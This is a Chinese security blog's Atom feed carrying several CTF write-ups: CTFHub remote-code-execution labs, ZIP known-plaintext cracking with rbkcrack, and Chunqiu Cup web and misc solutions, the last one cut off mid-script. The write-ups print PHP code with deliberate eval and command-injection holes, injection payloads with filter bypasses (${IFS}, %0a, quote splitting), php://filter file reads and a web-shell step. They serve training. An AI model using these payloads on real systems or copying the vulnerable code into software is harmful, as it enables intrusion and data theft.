<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://m3x1.cn/"/>
  <updated>2025-02-01T13:26:47.646Z</updated>
  <id>https://m3x1.cn/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTFHub技能树-rce</title>
    <link href="https://m3x1.cn/posts/72fb0684.html"/>
    <id>https://m3x1.cn/posts/72fb0684.html</id>
    <published>2025-01-31T16:00:00.000Z</published>
    <updated>2025-02-01T13:26:47.646Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>没有任何绕过，直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>审计代码，发现过滤了flag关键字，include包含文件的内容，根据提示，发现有个shell.txt文件，而且文件内容是接受传参请求，可以利用这个漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>所以思路就是文件包含shell.txt文件，然后传参触发eval函数来rce。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>有个phpinfo()的网页，打开，搜索flag，没有。</p><p>根据提示使用php://input协议</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>根据代码和提示，要使用php协议读取目录/flag</p><p>直接使用filter协议读取，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>跟上面的题目一样,直接使用php://input，然后写入一句话木马</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>蚁剑连接，拿到flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个ping网址的功能，先试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>打开278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了cat，但是可以用tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>过滤了空格可以用${IFS}代替</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>过滤了目录分隔符，但是可以使用命令拼接来找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了|和&amp;符号，但是可以用分号;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，过滤了|&amp;; ，可以使用%0a来作为回车符使用，效果一样</p><p>过滤三个关键字cat,flag,ctfhub，可以使用两个单引号或者两个双引号绕过</p><p>过滤空格，可以使用${IFS}绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树-rce系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>两种明文攻击</title>
    <link href="https://m3x1.cn/posts/fcd8d963.html"/>
    <id>https://m3x1.cn/posts/fcd8d963.html</id>
    <published>2025-01-19T16:00:00.000Z</published>
    <updated>2025-01-21T06:22:40.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、完整的明文文件"><a href="#一、完整的明文文件" class="headerlink" title="一、完整的明文文件"></a>一、完整的明文文件</h4><p>要达成明文攻击需要注意以下三点</p><p>①完整的明文文件</p><p>②明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</p><p>③明文对应文件的加密算法需要是 ZipCrypto（ZipCrypto又分为ZipCrypto Deflate/ZipCrypto Store）</p><p>使用ARCHPR进行明文攻击</p><p>破解时长应该不超过5分钟，运行至5分钟左右可以手动停止，ARCHPR会跳出来破解出的三个key。当然，这个结果并不是压缩包的密码，而是一个去除密码的压缩包<code>xxx_decrypted.zip</code>，把这个文件直接解开就可以了。</p><p>用以上方法需要已知一整个明文文件。</p><h4 id="二、已知一部分明文"><a href="#二、已知一部分明文" class="headerlink" title="二、已知一部分明文"></a>二、已知一部分明文</h4><p>使用rbkcrack只需要知道加密压缩包内容的连续12个字节，即可进行攻击破解。同时，结合各类已知的文件格式，更扩宽了ZIP已知明文攻击的攻击面。</p><blockquote><p>rbkcrack下载地址：</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrack常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C 加密的压缩包</span><br><span class="line">-c 压缩包内加密的文件</span><br><span class="line">-p 明文内容</span><br><span class="line">-k 输入key</span><br><span class="line">-o 偏移量</span><br><span class="line">-d 攻击完成后导出解密文件</span><br><span class="line">-u 自动解压</span><br></pre></td></tr></table></figure><p>实例：</p><p>png是制作的png文件头</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>拿到key后进行解密</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>因为LP.zip是以ZipCrypto Deflate方式加密的</p><p>所以解密后注意得到的out.png是deflate的数据流，需要使用python脚本进行解码</p><p>在rbkcrack的tools里找到这个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>至此大功告成，成功提取到压缩文件里的LP.png</p>]]></content>
    
    
    <summary type="html">🥧两种明文攻击</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="misc姿势" scheme="https://m3x1.cn/tags/misc%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.19</title>
    <link href="https://m3x1.cn/posts/55fde2b7.html"/>
    <id>https://m3x1.cn/posts/55fde2b7.html</id>
    <published>2025-01-18T16:00:00.000Z</published>
    <updated>2025-01-22T06:51:48.573Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><blockquote><p>考点：文件上传绕过，截断，源码审计</p></blockquote><p>打开网站后，可以下载源码，先下载源码，然后再扫一下网站目录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181445364.png" alt="image-20250119181445364"></p><p>配合源码审计，审计过程省略。其中在文件上传的目录下已经有文件了，再结合提示可以知道，不用再自己上传文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181544673.png" alt="image-20250119181544673"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181621889.png" alt="image-20250119181621889"></p><p>那么就需要触发文件，看这里代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181707567.png" alt="image-20250119181707567"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181802190.png" alt="image-20250119181802190"></p><p>可以知道在/file.php页面中可以进行url的get传参，然后会将参数值过滤后进行高亮，触发反序列化链。</p><p>但是这里的过滤中，是f1ag而不是flag，所以其实没有过滤flag关键词。</p><p>因此结合源码，直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119182045246.png" alt="image-20250119182045246"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a16dcb7549915546893a27a6d7927615&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-code"><a href="#easy-code" class="headerlink" title="easy_code"></a>easy_code</h4><blockquote><p>考点：利用PHP特性绕过，filter伪协议</p></blockquote><p>访问/robots.txt 可以看到有 gogogo.php</p><p>ctfer 参数有三个检测，只需要用科学计数法，PHP 会自动四舍五入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br></pre></td></tr></table></figure><p>Hackbar 里设置 cookie 为 pass=admin</p><p><img src="http://cn-sec.com/wp-content/uploads/2025/01/6-1737303857.png" alt="2024春秋杯冬季赛三日Writeup汇总(https://gitee.com/star3119391396/cloudimage/raw/master/img/6-1737303857.png)"></p><p>Include 那里使用 php://filter 配合 convert.iconv 修改字符集使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ile=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h4><blockquote><p>考点：知道部分明文破解压缩包</p></blockquote><p>下载附件解压，是一个wav文件，根据提示知道，是deepsound加密，且密码为弱口令。</p><p>用deepsound解密，弱口令密码一个一个试，最后密码为123，得到一个flag.zip</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120222149903.png" alt="image-20250120222149903"></p><p>提取出来，发现需要密码，压缩包内是一张图片。</p><p>用各种工具爆破，发现长时间都没爆破出来，最后赛后复现，看别人wp才知道，明文加密除了使用完整明文文件外，也有一种使用一部分明文文件的爆破方式。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120225951271.png" alt="image-20250120225951271"></p><p>得到一张png图片，在rgb处发现flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120230117284.png" alt="image-20250120230117284"></p><blockquote><p>flag{Y1_Shun_jian_Fa_ZE_Dian_Fu}</p></blockquote><h4 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h4><blockquote><p>考点：套娃压缩包，解码</p></blockquote><p>下载压缩包解压，里面是张png图片，放进010editor查看，发现有嵌套文件。</p><p>进行文件分离，得到一个压缩包。</p><p>压缩包里有zip,tar,7z三种，且压缩包名字感觉像是某种编码。</p><p>写脚本直接解压并记下文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip\\&quot;</span><br><span class="line">count = []</span><br><span class="line">txt = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\count.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    contents = os.listdir(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i not in count:</span><br><span class="line">            file_path = path + i</span><br><span class="line">            txt.write(i + &quot;\n&quot;)</span><br><span class="line">            file_extension = i.split(&#x27;.&#x27;)[-1]</span><br><span class="line">            if file_extension == &#x27;zip&#x27;:</span><br><span class="line">                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:</span><br><span class="line">                    zip_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;tar&#x27;:</span><br><span class="line">                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:</span><br><span class="line">                    tar_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;7z&#x27;:</span><br><span class="line">                with py7zr.SevenZipFile(file_path, &#x27;r&#x27;) as seven_ref:</span><br><span class="line">                    seven_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;File extension not supported&quot;)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122143943094.png" alt="image-20250122143943094"></p><p>解压后得到一个SeCr3t.txt，文件内容是Inf1nityIsS0CoOL。</p><p>用脚本对这些字符串进行处理，发现在逆序的时候能根据提示进行解码。即代码中的第二个print。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\Infinity\\flag.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">#文本之中每行有一个字符串</span><br><span class="line">data = data.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(data))  #将每行字符串顺序连接起来</span><br><span class="line">print(&quot;&quot;.join(reversed(data)))  #将每行字符串逆序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in data]))  #将每行字符串反转后顺序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in reversed(data)])) #将每行字符串反转后再逆序连接起来</span><br></pre></td></tr></table></figure><p>根据提示知道，是BASE58-Ripple<code>+</code>SM4-ECB，sm4中的key改为上述文件内容，得到一张条形码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144403181.png" alt="image-20250122144403181"></p><p>由于下载下来的图片是很暗的，很难直接识别，所以要先加白底。简便方法就i是直接预览加截图保存，然后扫描截图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144536029.png" alt="image-20250122144536029"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144840998.png" alt="image-20250122144840998"></p><blockquote><p>flag{a72dd260-f64d-4116-ab50-b26b40d69883}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.19</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.18</title>
    <link href="https://m3x1.cn/posts/22fad221.html"/>
    <id>https://m3x1.cn/posts/22fad221.html</id>
    <published>2025-01-17T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.837Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Weevil’s-Whisper"><a href="#Weevil’s-Whisper" class="headerlink" title="Weevil’s Whisper"></a>Weevil’s Whisper</h4><blockquote><p>考点：流量分析，代码审计</p></blockquote><p>下载附件，进行流量分析，看到上传的代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118152835441.png" alt="image-20250118152835441"></p><p>进行代码审计可以知道，在http中的返回结果是由$p$kh$r$kf组成的，而$p,$kh,$kf是固定的，所以可以提取出来$r。</p><p>再看代码，$r是$o进行一系列加密而成，而$o就是执行完成后返回的结果，所以只需要写脚本反解$r就能出现结果。</p><p>exp:</p><p>提取$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 示例字符串列表</span><br><span class="line">strings = [</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUFRXAGExNS5kaQ==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUVRSBofUNDFgR2Uu4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6KU+uuy3+Gn+oqy3SgTM2GBxmng==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    